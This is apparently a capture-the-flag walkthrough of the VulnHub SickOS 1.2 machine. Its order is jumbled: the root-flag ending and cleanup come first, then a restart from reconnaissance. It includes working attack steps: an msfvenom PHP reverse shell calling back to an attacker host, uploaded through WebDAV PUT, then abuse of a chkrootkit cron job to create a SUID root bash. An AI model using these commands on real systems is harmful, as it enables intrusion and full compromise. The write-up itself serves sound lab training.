connections is tricky and we don't know yet how that's working, let's just have root create a SUID version of bash for us. We'll create our script on the attacking machine and then transfer it over using PUT (like before).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# cat update</div><div>#!/bin/sh</div><div>chown root /tmp/bash</div><div>chmod u+s /tmp/bash</div><div>root@kali:~/Walkthroughs/sickos12# curl -v0T update --url http://10.183.0.196/test/update</div></div><div><br/></div><div>Then, on the victim...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@ubuntu:/tmp$ cd /tmp</div><div>www-data@ubuntu:/tmp$ cp /bin/bash .</div><div>www-data@ubuntu:/tmp$ mv /var/www/test/update .</div><div>www-data@ubuntu:/tmp$ chmod +x update</div></div><div><br/></div><div>Now, we just have to wait for the next time chkrootkit runs. Since it is set to run daily, we shouldn't have to wait more than 24-hours.</div><div><br/></div><div>Well... just a few minutes later... we see our commands have run...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@ubuntu:/tmp$ ls -l</div><div>total 904</div><div>-rwsr-xr-x 1 root     www-data 920788 Apr 22 15:47 bash</div><div>srwxr-xr-x 1 www-data www-data      0 Apr 22 05:38 php.socket-0</div><div>-rwxr-xr-x 1 www-data www-data     52 Apr 22 15:48 update</div></div><div><br/></div><div>The bash executable is now owned by root and has the sticky bit set. This makes getting root a breeze.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@ubuntu:/tmp$ ./bash -p</div><div>./bash -p</div><div>bash-4.2# id</div><div>id</div><div>uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)</div></div><div><br/></div><div>Let's get that flag...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>bash-4.2# cd /root</div><div>bash-4.2# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</div><div>WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.</div><div><div><br/></div></div><div>Thanks for giving this try.</div><div><div><br/></div></div><div>@vulnhub: Thanks for hosting this UP!.</div></div><div><br/></div><div><br/></div><div><h2>Pivoting</h2></div><div>N/A</div><div><br/></div><div><br/></div><div><h2>Clean Up</h2></div><div><br/></div><div>*** REMOVE /var/www/test/rev.php ***</div><div>*** STOP /var/www/test/rev.sh ***</div><div>*** REMOVE /var/www/test/rev.sh ***</div><div>*** REMOVE /tmp/bash ***</div><div>*** REMOVE /tmp/update ***</div><div><br/></div><div><br/></div><div><br/></div><div><h2>Additional Info</h2></div><div><br/></div><div><span style="font-weight: bold;">Enumerating OpenSSH Users</span></div><div><br/></div><div>Let's see about that user enumeration issue in OpenSSH.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                                     | exploits/linux/remote/45233.py</div></div><div><br/></div><div>I copy 45233.py from the exploit database and run it to check the options. However, I'm greeted with an error. Apparently the paramiko library has changed since the exploit was written and I need to update all references to _handler_table to _client_handler_table. After making this change, I'm able to run the script and enumerate some user accounts.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>python 45233.py --threads 4 --outputFile ssh-enum --outputFormat json --userList /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt 10.183.0.196</div></div><div><br/></div><div>We are able to enumerate the following accounts:</div><ul><li><div>backup</div></li><li><div>bin</div></li><li><div>daemon</div></li><li><div>games</div></li><li><div>gnats</div></li><li><div>irc</div></li><li><div>john</div></li><li><div>libuuid</div></li><li><div>list</div></li><li><div>lp</div></li><li><div>mail</div></li><li><div>man</div></li><li><div>messagebus</div></li><li><div>news</div></li><li><div>nobody</div></li><li><div>proxy</div></li><li><div>root</div></li><li><div>sshd</div></li><li><div>sync</div></li><li><div>sys</div></li><li><div>syslog</div></li><li><div>uucp</div></li><li><div>www-data</div></li></ul><div><br/></div><div><br/></div><div><span style="font-weight: bold;">iptables</span></div><div><br/></div><div>Checking the iptables after we got root, it appears the only other outbound port that would have worked was 8080.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@ubuntu:~# iptables-save</div><div># Generated by iptables-save v1.4.12 on Mon Apr 22 16:08:25 2019</div><div>*filter</div><div>:INPUT DROP [165904:10347077]</div><div>:FORWARD ACCEPT [0:0]</div><div>:OUTPUT DROP [72522:5152658]</div><div>-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT</div><div>-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</div><div>-A INPUT -p tcp -m tcp --sport 8080 -j ACCEPT</div><div>-A INPUT -p tcp -m tcp --sport 443 -j ACCEPT</div><div>-A OUTPUT -p tcp -m tcp --sport 22 -j ACCEPT</div><div>-A OUTPUT -p tcp -m tcp --sport 80 -j ACCEPT</div><div><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">-A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT</font></div><div><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">-A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT</font></div><div>COMMIT</div><div># Completed on Mon Apr 22 16:08:25 2019</div></div><div><br/></div><div>There are also some interesting "source port" rules. So, you could open a bind shell on any port on the victim, but you'd have to specify a source port of 443 or 8080 to reach it. Or, you could do a reverse shell from the victim, but you'd have to specify a source port of 22 or 80 for having it reach back to the attacker (which would require root, to bind to the low ports). You can use the -p option in netcat (when acting as a client) to specify your source port.</div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">/etc/cron.d</span></div><div><br/></div><div>I wasn't able to access the cron.d folder as a limited user. Once I got root, I went to see why. Turns out, this is where chkrootkit is set to run every minute (which is why I was able to elevate privs so quickly... thankfully).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@ubuntu:/etc/cron.d# cat chkrootkit </div><div>* * * * * root /usr/sbin/chkrootkit</div></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div></body></html>
+<div>VulnHub URL: <a href="https://www.vulnhub.com/entry/sickos-12,144/" target="_blank">https://www.vulnhub.com/entry/sickos-12,144/</a></div>
+<div>Hostname: ubuntu</div>
+<div>IP Address: 10.183.0.196</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Information Gathering/Recon</h2>
+</div>
+<div><br /></div>
+<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.196.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Service Enumeration/Scanning</h2>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# nmap -Pn -sT -sV -A -oA sickos12 -p 1-65535 10.183.0.196</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-22 13:44 EDT</div>
+    <div>Nmap scan report for ubuntu.homenet.dom (10.183.0.196)</div>
+    <div>Host is up (0.0041s latency).</div>
+    <div>Not shown: 65533 filtered ports</div>
+    <div>PORT   STATE SERVICE VERSION</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp open  ssh     </font>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH 5.9p1</font>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;"> Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</font>
+    </div>
+    <div>| ssh-hostkey:</div>
+    <div>|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)</div>
+    <div>|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)</div>
+    <div>|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp open  http    lighttpd 1.4.28</font>
+    </div>
+    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">lighttpd/1.4.28</font>
+    </div>
+    <div>|_http-title: Site doesn't have a title (text/html).</div>
+    <div>MAC Address: 08:00:27:D8:A3:27 (Oracle VirtualBox virtual NIC)</div>
+    <div>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</div>
+    <div>Device type: general purpose</div>
+    <div>Running: Linux 3.X|4.X</div>
+    <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
+    <div>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4</div>
+    <div>Network Distance: 1 hop</div>
+    <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>TRACEROUTE</div>
+    <div>HOP RTT     ADDRESS</div>
+    <div>1   4.09 ms ubuntu.homenet.dom (10.183.0.196)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+    <div>Nmap done: 1 IP address (1 host up) scanned in 117.22 seconds</div>
+</div>
+<div><br /></div>
+<!--more-->
+<div><br /></div>
+<div>
+    <h2>Gaining Access</h2>
+</div>
+<div><br /></div>
+<div>The nmap scan returned the following software versions.</div>
+<ul>
+    <li>
+        <div>OpenSSH 5.9p1 - primarily issues with username enumeration</div>
+    </li>
+    <li>
+        <div>lighttpd/1.4.28 - no applicable vulnerabilities</div>
+    </li>
+</ul>
+<div><br /></div>
+<div>I'm going to start by looking at the HTTP service on TCP port 80. Before actually browsing to the site, though, I'm going to scan the service with nikto.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# nikto -h http://10.183.0.196</div>
+    <div>- Nikto v2.1.6</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Target IP:          10.183.0.196</div>
+    <div>+ Target Hostname:    10.183.0.196</div>
+    <div>+ Target Port:        80</div>
+    <div>+ Start Time:         2019-04-22 14:06:55 (GMT-4)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">lighttpd/1.4.28</font>
+    </div>
+    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
+    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
+    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
+    <div>+ All CGI directories 'found', use '-C none' to test none</div>
+    <div>+ Retrieved x-powered-by header:<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> PHP/5.3.10-1ubuntu3.21</font>
+    </div>
+    <div>+ 26545 requests: 0 error(s) and 4 item(s) reported on remote host</div>
+    <div>+ End Time:           2019-04-22 14:08:43 (GMT-4) (108 seconds)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ 1 host(s) tested</div>
+</div>
+<div><br /></div>
+<div>Nikto finds surprising little. Guess I'll have to browse to the site to see what's going on.</div>
+<div><br /></div>
+<div>The default site is equally useless. It only returns an image and a comment that says "NOTHING IN HERE".</div>
+<div><br /></div>
+<div>Let's see if there are any interesting <a href="https://www.owasp.org/index.php/Test_HTTP_Methods_(OTG-CONFIG-006)" target="_blank">HTTP methods</a> supported. We can try to get the methods using curl...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# curl -sIX OPTIONS --url http://10.183.0.196</div>
+    <div>HTTP/1.1 200 OK</div>
+    <div>X-Powered-By: PHP/5.3.10-1ubuntu3.21</div>
+    <div>Content-type: text/html</div>
+    <div>Transfer-Encoding: chunked</div>
+    <div>Date: Mon, 22 Apr 2019 21:08:36 GMT</div>
+    <div>Server: lighttpd/1.4.28</div>
+</div>
+<div><br /></div>
+<div>As well as nmap...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# nmap -p 80 --script http-methods 10.183.0.196</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-22 17:14 EDT</div>
+    <div>Nmap scan report for ubuntu.homenet.dom (10.183.0.196)</div>
+    <div>Host is up (0.0016s latency).</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>PORT   STATE SERVICE</div>
+    <div>80/tcp open  http</div>
+    <div>| http-methods: </div>
+    <div>|_  Supported Methods: GET HEAD POST OPTIONS</div>
+    <div>MAC Address: 08:00:27:D8:A3:27 (Oracle VirtualBox virtual NIC)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds</div>
+</div>
+<div><br /></div>
+<div>Curl doesn't return anything interesting, and nmap just gives us the standard fare.</div>
+<div><br /></div>
+<div>Time to start brute forcing directories to see if we can find anything. Using wfuzz, I'm able to find two additional locations. One is listable, but empty (/test/). The other is "Forbidden" (/~sys~)... but a request to any directory ending in a tilde (~) returns 403 Forbidden... so that's not helpful.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# wfuzz -z file,/usr/share/dirb/wordlists/big.txt -t 30 --hc 404 http://10.183.0.196/FUZZ</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>********************************************************</div>
+    <div>* Wfuzz 2.3.4 - The Web Fuzzer                         *</div>
+    <div>********************************************************</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Target: http://10.183.0.196/FUZZ</div>
+    <div>Total requests: 20469</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>==================================================================</div>
+    <div>ID   Response   Lines      Word         Chars          Payload    </div>
+    <div>==================================================================</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>017880:  C=301      0 L        0 W            0 Ch        "test"</div>
+    <div>020464:  C=403     11 L       26 W          345 Ch        "~sys~"</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Total time: 26.72272</div>
+    <div>Processed Requests: 20469</div>
+    <div>Filtered Requests: 20467</div>
+    <div>Requests/sec.: 765.9772</div>
+</div>
+<div><br /></div>
+<div>The test directory is empty, but let's see if it supports any interesting HTTP methods.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# curl -sIX OPTIONS --url http://10.183.0.196/test/</div>
+    <div>HTTP/1.1 200 OK</div>
+    <div>DAV: 1,2</div>
+    <div>MS-Author-Via: DAV</div>
+    <div>Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK</div>
+    <div>Allow: OPTIONS, GET, HEAD, POST</div>
+    <div>Content-Length: 0</div>
+    <div>Date: Mon, 22 Apr 2019 21:18:11 GMT</div>
+    <div>Server: lighttpd/1.4.28</div>
+</div>
+<div><br /></div>
+<div>Ah. Now we are getting somewhere. It looks like the test directory has Web Distributed Authoring and Versioning (WebDAV) enabled. Let's see if we can upload a PHP reverse shell using the PUT method.</div>
+<div><br /></div>
+<div>First, we'll create our PHP reverse shell using msfvenom.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div>
+    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
+    <div>[-] No arch selected, selecting arch: php from the payload</div>
+    <div>No encoder or badchars specified, outputting raw payload</div>
+    <div>Payload size: 3033 bytes</div>
+</div>
+<div><br /></div>
+<div>Now, we'll use curl to try to upload the file.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# curl -T rev.php --url http://10.183.0.196/test/rev.php</div>
+    <div>&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;</div>
+    <div>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"</div>
+    <div>         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</div>
+    <div>&lt;html xml:lang="en" lang="en"&gt;</div>
+    <div> &lt;head&gt;</div>
+    <div>  &lt;title&gt;417 - Expectation Failed&lt;/title&gt;</div>
+    <div> &lt;/head&gt;</div>
+    <div> &lt;body&gt;</div>
+    <div>  &lt;h1&gt;417 - Expectation Failed&lt;/h1&gt;</div>
+    <div> &lt;/body&gt;</div>
+    <div>&lt;/html&gt;</div>
+</div>
+<div><br /></div>
+<div>Hmmm... we are getting a "417 - Expectation Failed" error. Googling this error, we see that we might need to set curl to use HTTP 1.0 with the -0 or --http1.0 option. Let's set that option and try again.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# curl -v0T rev.php --url http://10.183.0.196/test/rev.php</div>
+    <div>* Expire in 0 ms for 6 (transfer 0x563df5706d00)</div>
+    <div>*   Trying 10.183.0.196...</div>
+    <div>* TCP_NODELAY set</div>
+    <div>* Expire in 200 ms for 4 (transfer 0x563df5706d00)</div>
+    <div>* Connected to 10.183.0.196 (10.183.0.196) port 80 (#0)</div>
+    <div>&gt; PUT /test/rev.php HTTP/1.0</div>
+    <div>&gt; Host: 10.183.0.196</div>
+    <div>&gt; User-Agent: curl/7.64.0</div>
+    <div>&gt; Accept: */*</div>
+    <div>&gt; Content-Length: 3033</div>
+    <div>&gt; </div>
+    <div>* We are completely uploaded and fine</div>
+    <div>* HTTP 1.0, assume close after body</div>
+    <div>&lt; HTTP/1.0 200 OK</div>
+    <div>&lt; Content-Length: 0</div>
+    <div>&lt; Connection: close</div>
+    <div>&lt; Date: Mon, 22 Apr 2019 21:43:32 GMT</div>
+    <div>&lt; Server: lighttpd/1.4.28</div>
+    <div>&lt; </div>
+    <div>* Closing connection 0</div>
+</div>
+<div><br /></div>
+<div>No errors this time. Let's check the site.</div>
+<div><br /></div>
+<div><img height="280" src="/assets/images/2019-04-15-sickos-1.2/E6F57A07-3225-4D7A-8B65-9768739EE0F1.png" width="1060" /><br /></div>
+<div><br /></div>
+<div>Nice! Before clicking on the rev.php file, let's fire up our listeners in Metasploit. I like to start two listeners because the PHP reverse shell doesn't typically stay up very long. Once it is up, I like to start a second shell using perl.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
+    <div>payload =&gt; php/reverse_php</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
+    <div>LPORT =&gt; 5432</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 0.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div>
+    <div>msf5 exploit(multi/handler) &gt; </div>
+    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+    <div>payload =&gt; generic/shell_reverse_tcp</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
+    <div>LPORT =&gt; 5433</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 1.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5433</div>
+</div>
+<div><br /></div>
+<div>Now let's request our PHP reverse shell using curl.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# curl --url http://10.183.0.196/test/rev.php</div>
+</div>
+<div><br /></div>
+<div>Hmmm... That didn't seem to work... but why? It is possible the system has egress filtering and won't allow requests on just any port. Maybe if we try to have the reverse shell connect out on TCP port 80 or 443 (common web ports) it will work.</div>
+<div><br /></div>
+<div>Let's rebuild our PHP reverse shell using msfvenom. This time we'll have it try to connect back to us on TCP port 80.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=80 -f raw &gt; rev.php</div>
+    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
+    <div>[-] No arch selected, selecting arch: php from the payload</div>
+    <div>No encoder or badchars specified, outputting raw payload</div>
+    <div>Payload size: 2999 bytes</div>
+</div>
+<div><br /></div>
+<div>We'll re-upload rev.php using curl...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# curl -v0T rev.php --url http://10.183.0.196/test/rev.php</div>
+    <div>* Expire in 0 ms for 6 (transfer 0x55751dba7d00)</div>
+    <div>*   Trying 10.183.0.196...</div>
+    <div>* TCP_NODELAY set</div>
+    <div>* Expire in 200 ms for 4 (transfer 0x55751dba7d00)</div>
+    <div>* Connected to 10.183.0.196 (10.183.0.196) port 80 (#0)</div>
+    <div>&gt; PUT /test/rev.php HTTP/1.0</div>
+    <div>&gt; Host: 10.183.0.196</div>
+    <div>&gt; User-Agent: curl/7.64.0</div>
+    <div>&gt; Accept: */*</div>
+    <div>&gt; Content-Length: 2999</div>
+    <div>&gt; </div>
+    <div>* We are completely uploaded and fine</div>
+    <div>* HTTP 1.0, assume close after body</div>
+    <div>&lt; HTTP/1.0 200 OK</div>
+    <div>&lt; Content-Length: 0</div>
+    <div>&lt; Connection: close</div>
+    <div>&lt; Date: Mon, 22 Apr 2019 21:53:28 GMT</div>
+    <div>&lt; Server: lighttpd/1.4.28</div>
+    <div>&lt; </div>
+    <div>* Closing connection 0</div>
+</div>
+<div><br /></div>
+<div>We need to stop our previous listeners in Metasploit and start new ones. Hopefully the target can make outbound requests to 80, 443, and maybe 53. I'll set up listeners for each and we'll try them all.</div>
+<div><br /></div>
